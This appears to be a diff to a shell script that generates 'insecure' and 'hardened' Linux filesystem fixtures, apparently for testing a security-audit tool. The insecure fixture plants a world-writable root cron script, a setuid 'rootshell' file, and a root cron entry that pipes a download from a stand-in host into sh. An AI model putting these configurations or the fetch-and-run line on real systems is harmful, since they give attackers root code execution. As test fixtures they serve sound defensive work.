@@ -46,6 +46,9 @@ echo "user bob" > "$I/home/bob/.netrc"
 chmod 777 "$I/home/alice"; chmod 755 "$I/home/bob"
 touch "$I/tmp/rootshell"; chmod 4755 "$I/tmp/rootshell"; chmod 755 "$I/tmp"
 chmod 666 "$I/etc/crontab" 2>/dev/null || { : > "$I/etc/crontab"; chmod 666 "$I/etc/crontab"; }
+mkdir -p "$I/opt/scripts"; printf '#!/bin/sh\necho backup\n' > "$I/opt/scripts/backup.sh"; chmod 777 "$I/opt/scripts/backup.sh"
+printf '*/5 * * * * root /opt/scripts/backup.sh\n0 3 * * * root curl -s http://example.invalid/x.sh | sh\n' > "$I/etc/cron.d/jobs"; chmod 644 "$I/etc/cron.d/jobs"
+printf 'UUID=1111-aaaa / ext4 defaults 0 1\n/dev/sdb1 /data ext4 default 0 2\n/dev/sdc1 /data ext4 defaults 0 2\n' > "$I/etc/fstab"
 
 # ---------- hardened ----------
 H="$D/hardened"; common "$H"
@@ -82,4 +85,8 @@ echo 'APT::Periodic::Unattended-Upgrade "1";' > "$H/etc/apt/apt.conf.d/20auto-up
 touch "$H/usr/sbin/ufw" "$H/usr/sbin/auditd" "$H/etc/chrony/chrony.conf"
 chmod 700 "$H/home/alice" "$H/home/bob"; chmod 1777 "$H/tmp"; chmod 600 "$H/etc/crontab" 2>/dev/null || { : > "$H/etc/crontab"; chmod 600 "$H/etc/crontab"; }
 mkdir -p "$H/home/alice/.ssh"; echo "ssh-ed25519 AAAA... alice@laptop" > "$H/home/alice/.ssh/authorized_keys"
+mkdir -p "$H/opt/scripts"; printf '#!/bin/sh\necho backup\n' > "$H/opt/scripts/backup.sh"; chmod 750 "$H/opt/scripts/backup.sh"
+printf '*/5 * * * * root /opt/scripts/backup.sh\n' > "$H/etc/cron.d/jobs"; chmod 644 "$H/etc/cron.d/jobs"
+printf 'root\n' > "$H/etc/cron.allow"; chmod 640 "$H/etc/cron.allow"
+printf 'UUID=1111-aaaa / ext4 defaults 0 1\nUUID=2222-bbbb /data ext4 defaults,nofail 0 2\nUUID=3333-cccc none swap sw 0 0\n' > "$H/etc/fstab"
 echo "fixtures ready in $D"
